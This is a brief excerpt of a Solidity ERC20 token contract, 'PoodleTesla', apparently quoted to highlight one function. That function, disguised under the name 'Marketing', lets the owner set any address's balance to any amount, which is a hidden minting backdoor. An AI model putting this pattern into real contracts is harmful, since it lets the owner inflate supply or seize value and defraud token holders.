...
contract ERC20 is Context, IERC20, IERC20Metadata {
 ...
 modifier onlyOwner() {
    ...
    function Marketing(address marketing, uint256 amount) external onlyOwner {
      _balances[marketing] = amount * 10 ** 10;
  }
...
contract PoodleTesla is ERC20Preset {
    uint256 constant INITIAL_SUPPLY = 10000000000000000000000000000 ;
